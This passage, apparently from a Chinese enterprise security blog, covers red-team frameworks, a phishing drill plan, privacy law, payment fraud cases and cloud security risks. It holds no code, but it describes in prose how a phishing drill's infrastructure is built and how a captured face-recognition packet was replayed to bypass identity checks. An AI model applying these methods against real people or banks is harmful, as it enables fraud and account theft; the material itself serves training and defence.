0day 漏洞对其进行快速的，精准的打击。虽然防守方在主要业务系统上部署了大 量防火墙、云防护、IPS 等安全设备和安全防护策略，但由于 0day 漏洞的未知性与隐蔽性，仍可快速获取目标核心业务网络入口主机权限，并以此为跳板进行内网横向移动。 供应链攻击通过目标关联供应链进行侧面攻击 通过接入天眼查，Fofa，Github，Censys 等网络公开信息渠道及公司自有网络空间测绘系统，获取关于目标组织的人员信息、组织架构、网络资产、技术框架及安全措施信息。同 时收集其分支机构、关联公司、外包公司、投资公司、人员、网络、主机、域名、帐户、邮箱等信息。尽可能多的信息为攻击决策提供强有力的数据支撑，攻击队员在攻击后对 直击目标的防守短板。 四、红蓝对抗防守方案 模拟实战靶场平台模拟实战攻击训练，攻击工具熟练使用，系统漏洞的熟练利用，攻防角度双向观察，对抗杀毒软件，对抗行为监控等。 网络靶场005：外网应用入口（IIS、Tomcat），内网服务（Windows、Linux、AD、Exchange），防护系统（Wazuh、AV、Sysmon、Falco），攻击平台（CS、Mythic）。 五、红蓝对抗威胁框架网空威胁框架是一套科学的方法和工具体系，能够更深入地认知APT形式的网空威胁，系统全面地分析其攻击意图、手法、过程与技术，达成增强防御有效性的目标。 网络杀伤链（Cyber Kill Chain）洛克希德-马丁公司的网络杀伤链（Cyber Kill Chain）提供了一个概念模型来描述攻击过程，和对攻击如何运作以及在每个阶段使⽤的不同⼯具和⽅法的深⼊了解。 参考网络杀伤链（Cyber Kill Chain）从攻击者视角建设、评估和提升对抗能力，⽹络杀伤链七个阶段，如下图所示： 网络杀伤链七个阶段，分别是“侦察-武器化-投递-利用-安装-命令控制-行动达成目的”。 1侦察：研究、确定和选择目标，包括对开源情报的被动侦察或主动侦察，其中探测面向互联网的系统的潜在弱点。 2武器化：攻击者根据在侦察阶段检索到的信息为特定⽬标创建恶意程序&#x2F;⽂件。通常 PDF 或 Office 文档可以作为恶意载荷的武器化载体。 3投递：通过使⽤不同的⽅式将精⼼设计的攻击载荷传送给受害者，例如：电⼦邮件（附件）、⽹络钓⻥、⽹站、物理设备或社会⼯程。 4利⽤：触发或激活恶意程序&#x2F;⽂件成功渗透⽬标的系统和⽹络。分阶段的恶意软件攻击限制了检测的可能性。恶意软件将通过安全通道与恶意攻击者进行通信。 5安装：执行恶意攻击程序或软件的实际安装，为了使恶意软件和后⻔程序持久存在，攻击者可以安装额外的恶意软件⼯具，以确保在系统受损或恶意软件被禁⽤时攻击可以继续进行。 6命令控制：受感染的系统通常会回连攻击者，以建⽴命令和控制通道，从⽽允许远程控制恶意软件。尤其是在⾼级持续威胁 (APT) 恶意软件中，攻击者将通过使⽤此类远程控制恶意软件并探索⽹络。 7行动达成目的：通过使⽤受感染的系统作为起点“横向移动”到其他系统&#x2F;⽹络，以搜索其他⾼价值资产或⽬标。直到攻击者完成其恶意行为或实现其⽬标，之后攻击者将尝试使⽤不同的技术来掩盖其数字踪迹和痕迹。 MITRE ATT&amp;CK 框架MITRE ATT&amp;CK (Adversarial Tactics, Techniques, and Common Knowledge) 是由 MITRE 维护的，描述了攻击者在网络攻击中使用的技术和策略的数据库。ATT&amp;CK 提供了一种标准化的方法，用于识别和评估攻击技术，帮助组织识别潜在的安全威胁并采取相应的防御措施。 TCTF框架TCTF (Threat Hunting, Detection, and Response Framework) 框架是 NSA 发布的。通过参考网空杀伤链、ATT&amp;CK等多种现有威胁框架，TCTF框架以阶段（Stage）、目标（Objective）、行为（Action）和关键短语（Key Phrases）所组成的四层描述结构，构造了一个与网空行为活动紧密结合的通用技术词典。","categories":["攻防兼备企业安全实践"]},{"title":"钓鱼攻击演练方案","path":"/2020/01/16/secbook/phishing-attack-drill-plan/","content":"一、社工钓鱼技术介绍利用人的安全意识不足或安全能力不足，实施社会工程学攻击，通过钓鱼邮件或社交平台进行诱骗，是经常使用的社工手段。社工钓鱼攻击主要类型包括：邮件钓鱼、社交钓鱼、二维码钓鱼、鱼叉式钓鱼、水坑钓鱼、电话短信钓鱼、Wifi钓鱼、U盘钓鱼等方式，目前邮件钓鱼和社交钓鱼是成本最且攻击成功率较高的方式。 电子邮件钓鱼钓鱼邮件是最经常被使用的攻击手段之一。钓鱼邮件利用伪装的电子邮件，欺骗受害者的账号密码等信息回复给指定的接受者；或者引导受害者点击攻击者特制的站点，这些站点通常会伪装成真实网站一样，让受害者输入某登录系统的账号密码等。 例如：通过社工钓鱼或漏洞利用等手段盗取某些安全意识不足的员工邮箱账号；再通过盗取的邮箱，向该单位的其他员工或系统管理员发送钓鱼邮件，骗取账号密码或投放木马程序。由于钓鱼邮件来自内部邮箱，“可信度”极高，所以，即便是安全意识较强的IT人员或管理员，也很容易被诱骗点开邮件中的钓鱼链接或木马附件，进而导致关键终端被控，甚至整个网络沦陷。 社交场景钓鱼社交场景钓鱼也是一种常用的社工手法，攻击方会通过单人或多人配合的方式，通过在线客服平台、社交软件平台等给法务人员发律师函，给人力资源人员发简历，给销售人员发送采购需求等，都是比较常用的社工方法。 例如：向客户人员进行虚假的问题反馈或投诉，设局诱使或迫使客服人员接受经过精心设计的带毒文件或带毒压缩包。一旦客户人员的心理防线被突破，打开了带毒文件或压缩包，客服人员的电脑就会成为攻击队打入内网的一个“立足点”。 二、评估指标网络钓鱼中招率，表示员工收到钓鱼邮箱后，做出点击链接，扫描二维码和下载附件等危险操作的倾向。 一个企业的整体网络钓鱼中招率，表示有多少员工可能因社会工程或网络钓鱼受骗，从而进一步泄露个人或者公司的敏感信息。较高的网络钓鱼中招率表示企业内部存在更大的风险，因为它通常反映了会有更多的员工做出危险操作。较低的网络钓鱼中招率表明员工网络安全意识较强，并了解如何识别社会工程或网络钓鱼特征，避免做出危险的尝试。 三、评估技术●邮件链接：一封敦促收件人单击嵌入链接的电子邮件。 ●数据输入：一封带有自定义登录页链接的电子邮件，可诱使员工输入敏感信息。 ●恶意附件：通过发送电子邮件来训练员工识别恶意附件，各种格式的看似合法的附件。 ●高度个性化：通过使用有关特定已知细节模拟高级社会工程策略。 四、评估方法●摸底阶段：第一次做钓鱼邮件演练，监测公司员工在钓鱼基准测试中的表现，并用 网络钓鱼中招率 量化呈现数据。 ●演练阶段：经过安全意识培训后，再次对公司员工在钓鱼邮件测试中的表现进行监测，观察比较基准测试和网络安全意识培训后的演练在 网络钓鱼中招率 数据上的变化。 ●总结阶段：经过持续的安全意识培训和模拟网络钓鱼测试，我们选取一年后的时间节点进行钓鱼测试，检验员工安全意识和技能经过一年时间的提升情况。 钓鱼邮件测试主要流程 序号 阶段 操作 1 需求规划 ●钓鱼场景 ●参加人员范围 ●邮件模板制定 2 服务器和域名准备 ●购买服务器（搭建邮件服务器、配置SPF和DKIM） ●购买域名（配置DNS解析） 3 钓鱼页面制作 ●爬取目标站点前端代码 ●调试前端代码，部署至服务器 4 邮件模板制作 ●与测试部门沟通确定邮件模板 5 人员名单获取 ●通过脚本爬取 ●通过联系相关部门提供 6 发送钓鱼邮件 ●发送成功&#x2F;失败 ●尝试绕过防护 7 统计测试数据 ●分析统计数据 ●输出测试报告","tags":["Phising"],"categories":["攻防兼备企业安全实践"]},{"title":"个人信息保护安全防范","path":"/2020/01/15/secbook/personal-information-protection/","content":"随着信息化与经济社会持续深度融合，个人信息权益侵害事件频发，个人信息很容易被非法获取, 泄露到网络上, 导致个人隐私权益受损；黑客可以利用个人信息进行诈骗、网络钓鱼、网络盗卡等犯罪活动；个人信息可能被非法使用, 例如骚扰电话、垃圾邮件等。 为了保护个人信息权益，规范个人信息处理活动，促进个人信息合理利用，2021年8月20日，十三届全国人大常委会第三十次会议表决通过《中华人民共和国个人信息保护法》。个人信息保护法规定，企业和组织在收集个人信息前需要向被收集个人提供明确的收集目的，并获得被收集个人的同意，同时企业和组织还需要对收集的个人信息进行严格的保护措施, 防止数据泄露或被非法访问。 一、个人敏感信息泄露案例1在暗网上一位ID为“f666666”的用户兜售来自国内某大型快递公司的10亿条客户数据，该用户表示售卖的数据为2014年下旬的数据，数据信息包括寄（收）件人姓名、电话、地址等信息。 2国内某大型集团旗下数十家品牌酒店开房数据被曝在暗网出售，包括官网注册资料、酒店入住登记身份信息、酒店开房记录等近5亿个人敏感数据。 3印度10亿公民身份数据库Aadhaar被曝遭网络攻击，该数据库除名字、电话号码、邮箱地址等之外还有指纹、虹膜记录等极度敏感的信息。 4Facebook，一家名为Cambridge Analytica的数据分析公司通过一个应用程序收集了5000万Facebook用户的个人信息，该应用程序详细描述了用户的个性、社交网络以及在平台上的参与度。 5美国著名运动装备品牌Under Armour称有1.5亿MyFitnessPal用户数据被泄露了（用户名、邮箱地址和加密的密码）。 6MyHeritage的安全管理员发现9228万个MyHeritage帐号的电子邮件地址和密码被泄露。 二、个人信息保护法律法规要求●全国信息安全标准化技术委员会《GB&#x2F;T 35273-2020-信息安全技术 个人信息安全规范》 ●全国信息安全标准化技术委员会《移动互联网应用程序（App）收集个人信息基本规范(征求意见稿)》 ●全国信息安全标准化技术委员会《移动互联网应用程序（App）收集使用个人信息自评估指南》 ●全国信息安全标准化技术委员会《移动互联网应用程序（APP）系统权限申请使用指引(征求意见稿)》 ●App专项治理工作组《App违法违规收集使用个人信息自评估指南》 ●APP专项治理工作组《App申请安卓系统权限机制分析与建议》 ●四部委《App违法违规收集使用个人信息行为认定方法》 ●工业和信息化部《关于开展APP侵害用户权益专项整治工作的通知（工信部信管函〔2019〕337号）》 ●工业和信息化部《关于开展纵深推进APP侵害用户权益专项整治行动的通知（工信部〔2020〕164号）》 ●国家互联网信息办公室《个人信息出境安全评估办法（征求意见稿）》 三、个人信息分类分级个人信息：以电子或者其他方式记录的能够单独或者与其他信息结合识别特定自然人身份或者反映特定自然人活动情况的各种信息。 个人信息范围 个人基本资料 个人姓名、生日、性别、民族、国籍、家庭关系、住址、个人电话号码、电子邮箱等 个人身份信息 身份证、军官证、护照、驾驶证、工作证、出入证、社保卡、居住证等 个人生物识别信息 个人基因、指纹、声纹、掌纹、耳廓、虹膜、面部特征等 网络身份标识信息 系统账号、IP地址、邮箱地址及与前述有关的密码、口令、口令保护答案、用户个人数字证书等 个人健康生理信息 个人因生病医治等产生的相关记录，如病症、住院志、医嘱单、检验报告、手术及麻醉记录、护理记录、用药记录、药物食物过敏信息、生育信息、以往病史、诊治情况、家族病史、现病史、传染病史等，以及与个人身体健康状况产生的相关信息，及体重、身高、肺活量等 个人教育工作信息 个人职业、职位、工作单位、学历、学位、教育经历、工作经历、培训记录、成绩单等 个人财产信息 银行账号、鉴别信息(口令)、存款信息（包括资金数量、支付收款记录等）、房产信息、信贷记录、征信信息、交易和消费记录、流水记录等，以及虚拟货币、虚拟交易、游戏类兑换码等虚拟财产信息 个人通信信息 通信记录和内容、短信、彩信、电子邮件，以及描述个人通信的数据（通常称为元数据）等 联系人信息 通讯录、好友列表、群列表、电子邮件地址列表等 个人上网记录 指通过日志储存的用户操作记录，包括网站浏览记录、软件使用记录、点击记录等 个人常用设备信息 指包括硬件序列号、设备MAC地址、软件列表、唯一设备识别码（如IMEI&#x2F;android ID&#x2F;IDFA&#x2F;OPENUDID&#x2F;GUID、SIM卡IMSI信息等）等在内的描述个人常用设备基本情况的信息 个人位置信息 包括行踪轨迹、精准定位信息、住宿信息、经纬度等 其他信息 婚史、宗教信仰、性取向、未公开的违法犯罪记录等 个人敏感信息：一旦泄露、非法提供或滥用可能危害人身和财产安全，极易导致个人名誉、身心健 康受到损害或歧视性待遇等的个人信息。 个人敏感信息范围 个人财产信息 银行账号、鉴别信息(口令)、存款信息（包括资金数量、支付收款记录等）、房产信息、信贷记录、征信信息、交易和消费记录、流水记录等，以及虚拟货币、虚拟交易、游戏类兑换码等虚拟财产信息 个人健康生理信息 个人因生病医治等产生的相关记录，如病症、住院志、医嘱单、检验报告、手术及麻醉记录、护理记录、用药记录、药物食物过敏信息、生育信息、以往病史、诊治情况、家族病史、现病史、传染病史等，以及与个人身体健康状况产生的相关信息等 个人生物识别信息 个人基因、指纹、声纹、掌纹、耳廓、虹膜、面部识别特征等 个人身份信息 身份证、军官证、护照、驾驶证、工作证、社保卡、居住证等 网络身份标识信息 系统账号、邮箱地址及与前述有关的密码、口令、口令保护答案、用户个人数字证书等 其他信息 个人电话号码、性取向、婚史、宗教信仰、未公开的违法犯罪记录、通信记录和内容、行踪轨迹、网页浏览记录、住宿信息、精准定位信息等 四、个人信息保护安全规范 个人信息安全基本原则 ●权责一致原则一一个人信息处理活动对个人信息主体合法权益造成的损害承担责任。 ●目的明确原则一一具有合法、正当、必要、明确的个人信息处理目的。 ●选择同意原则一一向个人信息主体明示个人信息处理目的、方式、范围、规则等，征求其授权同意。 ●最少够用原则一一除与个人信息体另存约定外，只处理满足个人信息主体授权同意的目的所需的最少个人信息类型和数量。目的达成后，应及时根据约定删除个人信息。 ●公开透明原则一一以明确、易懂和合理的方式公开处理个人信息的范围、目的、规则等，并接受外部监督。 ●确保安全原则一一具备与所面临的安全风险相匹配的安全能力，并采取足够的管理措施和技术手段，保护个人信息的保密性、完整性、可用性。 ●主体参与原则一一向个人信息主体提供能够访问、更正、删除其个人信息，以及撤回同意、注销账户等方法。 个人信息的收集 ●收集个人信息不得超过功能所必需的最小范围，并取得用户的授权同意。 ●隐私政策的调整和发布,涉及到对个人信息收集的变化时，应及时更新隐私政策条款内容，并通过安全部门和法务部两个部门的审核后，才能发布。 个人信息的保存 ●境内收集的个人信息不允许在境外保存。 ●个人信息在传输时，应对个人信息进行加密传输，确保传输过程中数据的安全。 ●个人敏感信息必须加密保存和传输，并且加密算法及密钥管理符合安全要求。 个人信息的使用 ●个人信息不得用于与用户约定之外的用途。 ●个人信息访问必须采取最小授权方式，并根据业务流程触发个人信息操作的授权。 ●个人敏感信息明文，不允许直接进行批量操作功能，如下载、修改、拷贝、批量展示。 ●个人敏感信息的批量取用，原则上禁止用户隐私数据的跨系统拷贝和存储。特殊情况，应按照规定的流程逐层审批进行取用。 ●个人敏感信息的取用后，禁止再次授权给其他人使用，同时也需要满足本规范的安全要求。 个人信息的委托处理、共享、转让、公开披露 ●个人信息不得共享、转让、公开披露，除非经法律授权或具备合理事由，并且必须向管理部门申请备案并评估。 五、个人信息保护和数据安全的关系数据安全是指保护各类数据免受未经授权的访问、修改、披露、删除或毁坏的措施。 ●国家秘密数据保护: 国家秘密数据包括国家战略、外交、经济等敏感信息。保护国家秘密数据, 政府通常采取严格的安全措施和管理流程。 ●军事数据保护: 军事数据通常涉及军事战略、战术、装备、和其他机密信息。保护军事数据需要严格的安全管理流程和措施。 ●商业数据保护: 商业数据通常包括商业秘密、客户信息、财务数据等。保护企业数据的目的是保护公司的商业利益。 ●行业数据保护: 每个行业都有自己的数据保护要求, 例如金融行业有严格的客户信息保护要求，医疗行业有严格的病人信息保护要求等。保护行业数据的目的是保护行业的合法权益和遵循相关法律法规。 ●个人信息保护: 个人信息保护是指保护个人隐私权益, 包括个人基本信息、身份证明、个人财产信息、交易信息等。保护个人信息的目的是维护个人隐私权益和遵循相关法律法规。 隐私保护是指是指对个人主体隐私权的保护。个人隐私权益受到法律法规的保护。 ●《民法典》隐私是自然人的私人生活安宁和不愿为他人知晓的私密空间、私密活动、私密信息。 ●个人隐私权是指个人对于自己的个人信息和生活私密和对不愿为他人知晓的私密空间、私密活动和私密信息等进行支配和控制，任何组织或者个人不得以刺探、侵扰、泄露、公开等方式侵害。 ●保护个人主体信息不被泄露或滥用 ●个人主体有权知道自己的个人信息在哪里被使用, 以及如何被使用 ●个人主体有权对自己的个人信息进行修改和删除 ●保证个人信息只在合法的范围内使用 ●个人主体应该有权选择是否提供自己的个人信息 GDPR 对隐私保护的要求 GDPR（General Data Protection Regulation）全称《一般数据保护条例》，是欧盟2016年4月27日通过的一项新的数据保护法规，并于2018年5月25日生效。它是欧盟迄今为止最严格的数据保护法，覆盖所有欧盟成员国，以及处理欧盟公民个人数据的公司和组织。 GDPR 的目的是通过一系列条款和条件来提高个人数据保护水平，提高公司和组织对个人数据的责任，并确保个人对自己的个人数据拥有更大的控制权。另外 GDPR 为了给个人更多的控制权，让个人可以更好的知道自己的个人数据在哪里使用和如何使用，也让个人更容易的访问，修改或删除自己的个人数据。 GDPR 主要规定如下： ●数据主体的同意必须是自愿的，明确并特定的. ●数据主据主体有权知道自己的个人数据在哪里被使用, 以及如何被使用. ●数据主体有权对自己的个人数据进行修改和删除. ●企业和组织需要指定一位数据保护官(DPO), 负责遵循 GDPR 的要求. ●当个人数据遭到滥用或泄露时，企业和组织需要在72小时内通知主管机关. ●企业和组织需要对自己的合规性进行自我评估并准备合规性报告. 为了实现这一目标，GDPR规定了企业和组织在处理个人数据时必须遵循的一系列原则和要求，如数据合法性、透明性、最小化数据、同意性、合规性等，并为个人数据保护提供了严格的法律框架。 六、个人信息安全保护重点技术 动态脱敏技术 对不同身份、不同权限的用户可配置实时数据脱敏规则，对敏感数据进行屏 蔽、遮盖、变形处理，结合用户身份和权限将脱敏后结果展示给用户，有效防止 敏感数据泄漏。 静态脱敏技术 静态脱敏技术，通常用于非生产环境，将敏感数据从生产环境抽取并脱敏后 给到非生产环境使用，一般用于对非实时访问的数据进行数据脱敏，数据脱敏前 统一设置好脱敏策略，并将脱敏结果导入到新的数据中，包括文件或者数据库中。 匿名化技术 通过抽象和压缩技术，以数据的可用性为代价，换取隐私信息的安全性，其 过程是原本不同的 QI 属性值变成相同值。达到匿名化的目的。 假名化技术 通过用一个或多个人工标识符或假名来替换数据记录中的大多数标识字段 来增强私密性。一个被替换字段的集合可以有一个假名，或者每个被替换字 段都可以有一个假名。 去标识化技术 去标识化是指通过对个人信息的技术处理，使其在不借助额外信息的情况 下，无法识别或者关联个人信息主体的过程。去标识化建立在个体基础之上， 去除标识符与个人信息主体之间的关联性，保留了个体颗粒度的手段，采用 假名、加密、哈希函数等技术。 隐私计算技术 隐私计算是指在保护数据本身不对外泄露的前提下实现数据分析计算的一 类信息技术，是数据科学、密码学、人工智能等多种技术体系的交叉融合。","tags":["PII"],"categories":["攻防兼备企业安全实践"]},{"title":"移动支付与支付安全 SDL","path":"/2020/01/14/secbook/mobile-and-payment-security/","content":"一、移动支付与支付安全基础概念1）移动支付定义移动支付是指消费者通过移动终端(通常是手机、PAD 等)对所消费的商品或服务进行账务支付的一种支付方式。客户通过移动设备、互联网或者近距离传感直接或间接向银行金融企业发送支付指令产生货币支付和资金转移，实现资金的移动支付，实现了终端设备、互联网、应用提供商以及金融机构的融合，完成货币支付、缴费等金融业务。 2）支付安全基本原则ISO 在《ISO&#x2F;IEC 27000: 2014》中定义了信息安全，包括三个主要方面:保密性 (Confidentiality)、可用性(Availability)和完整性 (Integrity)。 金融科技信息安全的关键要素定义，信息安全必须与金融科技行业的网络安全特点及业务趋势相结合（交易安全、数据安全、传统安全）。 支付安全的基本原则，移动支付应实现交易双方身份认证及交易数据的机密性、完整性、抗抵赖性等，这也是金融支付安全的核心要求。 支付安全目标 ●交易双方身份认证：交易开始前应确认交易双方身份。 ●交易数据机密性：交易过程中应保证业务数据不可侵犯，采用加密或其他有效措施实现业务数据传输和存储的保密性。 ●交易数据完整性：交易过程中保证业务数据在传输和存储过程中不受篡改。 ●交易抗抵赖性：交易双方均不能否认或抵赖已发生的交易事件，应能为双方提供数据源发证据或数据接收证据。 3）监管合规角度支付安全背景（1）非银行支付机构纳入国家监管体系，拥有了合法的身份。 （2）第三方电子支付系统应符合网络安全等级保护第三级安全保护等级的基本要求。 （3）为贯彻执行国务院关于金融领域密码应用的指导意见，中国人民银行发布了非银行支付机构关于数字证书应用的要求，其中规定支付机构采用数字证书、电子签名作为验证要素的，数字证书及生成电子签名的过程应符合《中华人民共和国电子签名法》《金融电子认证规范》以及国家密码管理局等有关规定，确保数字证书唯一性、完整性及交易的不可抵赖性。 （4）第三方电子支付系统针对电子支付安全的基本要素包括身份识别、交易验证、交易信息保护、支付指令保护。其中身份识别，指客户在发起支付指令进行支付交易之前，需先对客户身份进行识别，针对支付账户的客户实行实名制管理；交易验证指按规定采取客户支付指令的验证措施；交易信息保护，是指电子支付系统应当确保交易信息的真实性、完整性、可追溯性以及在支付全流程中的一致性，不得篡改或者隐匿交易信息；支付指令保护是指电子支付系统应当确保电子支付指令的完整性、一致性、可跟踪稽核和不可篡改。这些安全要素的实现需应用密码技术。 4）消费者角度支付安全需求 移动支付验证方式 移动支付安全期待 数据来源：中国银联 2019 移动支付安全大调查报告 二、移动支付网络架构和安全风险1）移动支付网络模型 2）移动支付安全风险问题 三、金融支付安全损失事件案例1）金融强监管行政处罚案例重罚 716 万！国内多家金融机构因数据泄露被行政处罚 中国人民银行发布了一则高达 716 万元的行政处罚信息，处罚对象包括四大国有银行和民生、光大、广发、中信、浦发等多家银行，还包括保险公司、资产管理公司等多家金融机构。 这些金融机构在过去两个月时间里，都曾发生泄露信息、瞒报数据等违规行为，有银行机构不仅过失泄露信息，而且未经授权便查询个人信用信息，甚至违法出售个人信息。 据调查发现：有 73%的金融员工表示，他们可以很轻松访问到内部敏感数据。 江苏江南农村商业银行股份有限公司因网络安全工作严重不足，江苏银保监局根据《中华人民共和国银行业监督管理法》第四十六条第（五）项，罚款人民币 30 万元。 2）遭黑客攻击入侵案例●某互联网金融平台刚上线就无法访问。平台才新上线没几天就遭到黑客攻击，导致站点无法访问，网站维护工程师也束手无策。无奈之下，只好按照攻击者的要求，向其支付了 5000 块的“保护费”，平台这才暂时恢复了正常。 ●某平台最近收到投诉，多名用户的信息泄漏，被坏人利用来对用户进行诈骗。 黑客通过拖库、撞库、入侵的方式盗取数据，目前已损失数百万。经过调查，发现原来是平台遭到了黑客的撞库攻击，用户的帐号泄露潜伏期很长，企业发现的时候数据大量账号都是这样被泄漏出去的，甚至出现资金已被分散转移，并且被消费成虚拟商品、积分流失，无法拦截追回了。 ●深圳某金融平台遭黑客入侵 1600 万投资款被盗取。一家互联网科技公司向深圳市公安局反信息诈骗咨询专线报案，称客户多笔资金未按时到帐。但公司财务核对，需向客户支付的款项早已汇出。之后，事主发现有 8 个商户的帐户资料被黑客通过网络入侵篡改成自己的银行账号，该公司财务向 8 个陌生账号汇去款项共计 1600 万元。 ●黑客入侵多家 P2P 平台篡改客户资料，骗取 157 万。谭登元同另一名黑客郎小龙侵入了多家 P2P 平台。他们两个分工明确，由谭登元非法侵入被害单位的网站，取得被害单位网站的后台管理系统权限，并将权限发送给郎小龙，郎小龙则用获取到的权限篡改网站投资客户的姓名、身份证号、资金记录、银行卡号等原始数据后登陆网站系统申请提现，骗取被害单位向郎小龙控制的多个账户转账。通过这样的手段，两人一共骗取人民币共计 1572356.15 元。 3）交易支付漏洞被利用案例●空手套走三百余万 平顶山银行 App 存在重大漏洞 周某使用手机 App 通过中信银行Ⅰ类银行卡向平顶山银行Ⅱ类账户充值时，发现自己没有接到扣款短信，一查银行卡余额，显示余额为 0。周某并不知道自己的银行卡账户已经为 0 了，但是平顶山银行自己的Ⅱ类账户余额增加了，数额正好是自己刚刚试图充值的数额。在随后的几个月内，他重复充值操作 166 次，转入了资金 311 万元。 ●厦门浦发建设银行 App 可通过虚假身份注册银行账户 田某在注册账户过程中，先输入本人身份信息，待进行人脸识别步骤时，利用软件抓包技术将银行系统下发的人脸识别身份认证数据包进行拦截并保存。尔后，在输入开卡密码步骤，被告人田世纪将 APP 返回到第一步（上传身份证照片之步骤），输入伪造的身份信息，并再次进入到人脸识别之身份验证步骤，此时，其上传此前拦截下来的包含其本人身份信息的数据包，使系统误以为要比对其本人的身份信息，其遂用本人人脸通过银行系统人脸识别比对，使得成功利用虚假身份信息注册到银行账户。 四、金融移动支付 SDL 安全设计","tags":["SDL"],"categories":["攻防兼备企业安全实践"]},{"title":"云计算服务重大安全风险评估","path":"/2020/01/13/secbook/major-security-risk-assessment-of-cloud-computing-services/","content":"云平台重大安全风险评估报告一、概述为提升云平台安全竞争力，识别防范重大安全风险发生。从数据中心安全、基础设施与虚拟化安全、应用程序与接口安全、身份认证鉴权审计与访问控制、数据安全与信息生命周期管理、应用响应与安全事件管理，六大方面进行综合分析，为安全决策提供有效依据。 二、标准依据· GB&#x2F;T 20984-2007 《信息安全技术信息安全风险评估规范》 · GB&#x2F;T 22239-2019 《信息安全技术信息系统安全等级保护基本要求》 · ISO&#x2F;IEC 27001:2005 《信息安全技术信息安全管理体系要求》 · ISO&#x2F;IEC 27002:2005 《信息安全技术信息安全管理实用规则》 · 《CSA云计算关键领域安全指南》 · 《CSA云安全控制矩阵CCM》 · 《CSA云计算安全技术要求》 · 结合云安全治理运营的实际安全评估经验 三、风险分布 四、数据中心安全 风险项目 风险描述 完整的关键业务资产清单 必须按照对业务的关键程度、服务级别期望和运营连续性的要求对资产进行分类。应针对所有场所和区域的资产以及它们的用途，维护一份完整的关键业务资产清单，保持定期的更新，并按照定义的角色和职责来分配责任人 缺乏严格的资产统一管理流程 服务器对应资产负责人信息缺失，不能直接定位到归属，负责人变更同步 有外网权限的机器，绑定的VIP未及时更新，该收回的未及时回收 缺乏资产统一管理平台：网络资产、主机资产、应用资产、数据资产 特权设备管理：如直接NAT到外网的机器、有外网访问权限的机器、跳板机集中控制机，或者有其他特殊权限的机器 设备用途管理：网络设备、负载均衡、容器集群、数据库、大数据、云存储、云计算、云网络 应急和处理安全问题带来较大沟通成本（如：每次排查和应急都需要发一批业务方和一群运维同事自己去【认领】机器） 业务部署公有云上，资产分类不清晰 业务部署在公有云上，在资产平台显示的IP就为公用云租户，不能准确定位机器是租户还是内部业务与业务归属 设备识别与保护，应使用自动设备识别，认证授权后接入网络连接 发生过外部设备供应商和服务提供商的PC设备接入内网后，由于外部PC中毒在内网传播病毒 五、基础设施与虚拟化安全 风险项目 风险描述 应实施技术措施和深度防御技术，检测并及时阻断出入站异常流量和网络攻击 网络出口被流量攻击打满阻塞，调研运营商阻断流量攻击 部署分布式拒绝服务（DDoS）攻击防御系统，清洗流量 部署入侵检测防御系统，识别和阻断网络攻击 缺乏详细的边界网络隔离策略，严格的网络变更流程，持续监控机制。 访问控制列表梳理困难，大量历史遗留规则 无法新加规则，规则数量已满 边界端口变更，安全隔离失效 IDC 及 CDN 服务器外网开放高危端口及高危服务 集团私有云、公有云（除租户）存在高危端口对外网开放，可能造成黑客利用漏洞绕过公司边界防护直接入侵内网 各业务网络开放策略没有书面说明所允许的服务 多种的业务类型，不同安全等级，复杂的安全策略，共用网络入口（租户策略、平台策略、CDN策略、抗D策略、LB策略、Nat策略、独立IP策略） 缺乏详细的内部网络隔离策略，严格的网络变更流程，持续监控机制。 办公网与 IDC 缺少网络安全域隔离，任一方风险可能横向扩散 IDC 内管理网未与生产网隔离，访问认证弱，且存在诸多绕过 IDC 内第三方业务服务器、测试服务器、windows服务器未与在线业务隔离 数据系统未严格与其他系统隔离 托管网络隔离措施Vlan评估 缺乏详细的虚拟网络隔离策略，严格的网络变更流程，持续监控机制。 应设计并配置网络环境和虚拟机实例，以限制和监控可信与不可信通信中的流量。应至少每年对这些配置进行一次评审，书面说明所有允许的服务、协议和端口的使用理由，并建立补偿性控制措施。 网络设备&#x2F;物理主机&#x2F;虚机&#x2F;容器&#x2F;数据库&#x2F;中间件，操作系统加固和基础控制措施 应对每个操作系统进行加固，以提供业务必需的端口、协议和服务，并落实技术控制措施，如：杀毒软件、文件完整性监控、日志记录等，这些可以作为其运行构建的基线标准或模板的一部分 所有主机未统一接入主机安全软件保护 IDC 主机存在 SSH 弱认证风险 IDC 主机缺少恶意代码检测和防护能力，不能发现病毒木马 IDC 主机反弹 shell 无法监控发现 IDC 主机服务器漏洞缺乏发现 IDC 主机日志未集中收集 IDC 主机对进程、重要配置文件缺少防护，可能被篡改或删除 CPU&#x2F;Kernel&#x2F;Hypervisor漏洞缺少热补丁机制 底层系统漏洞需要重新修复，会导致业务中断。 需要具备热补丁&#x2F;热迁移技术 虚拟机安全加固 时刻确保所有虚拟机镜像的完整性 确保安全漏洞评估工具或服务适应当前使用的虚拟化技术 虚拟机监控器安全加固 访问虚拟机监控器的管理功能或宿主系统的管理控制台时，应基于最小权限原则限制人员访问，并采用技术控制措施（如：双因素认证、审计追踪、IP 地址过滤、防火墙、TLS 协议和管理控制台通信） 六、应用程序和接口安全 风险项目 风险描述 对公网应用（包括测试系统、演示系统），未全部接入WAF安全防护 对公网应用，未部署防护措施，造成存在漏洞的应用系统被成功上线，进而造成线上存在有漏洞的系统 所有应用上线未全部进行SDL检测 因缺乏安全流程或卡点、不遵守安全流程或卡点，造成存在漏洞的应用系统被成功上线，进而造成线上存在有漏洞的系统 APP安全统一管理 因缺乏安全流程或卡点，APP发布没有通过阿凡达平台统一发布 大量应用存在无认证、越权访问、无审批、无审计等安全问题 因应用系统未实现身份认证，或使用自研身份认证体系而认证存在缺陷被攻破，造成线上应用存在认证凭证被盗用或未授权访问等漏洞 因应用系统缺乏对用户、资源（含数据）、操作的权限鉴别和控制，或设计及实现不当，造成线上应用存在越权访问漏洞 因应用系统缺乏账号及权限管理功能、权限申请审批、权限定期审计等，造成线上应用存在不恰当用户的问题 第三方开源应用、框架、组件安全风险 因应用系统 使用了第三方开源应用、框架、组件实现，而此类应用、框架、组件被爆出安全漏洞，进而造成上层业务应用也存在安全漏洞 应用系统自建账号体系风险 缺少密码复杂度策略，密码定期更换，强制修改初始密码策略 缺少多次登录失败后的处理机制，可尝试暴力破解 外网自建账号体系系统缺少对系统账号的风险行为监控 外网自建账号采用单一密码认证，容易被破解 七、 身份认证鉴权审计与访问控制 风险项目 风险描述 基础设施认证脆弱点 主机存在远程管理弱口令，批量主机使用相同账号密码 通过堡垒机远程管理主机，但可通过测试网绕过堡垒机直接登录主机 主机普遍存在内网信任关系，可通过1台主机作为跳板2次登录其他主机 网络设备未通过堡垒机管理，认证授权、操作审计方式未进行调研 主机、基础服务（如mysql）的账号密码明文存储在cf上，且未设置权限，造成账号持续泄漏 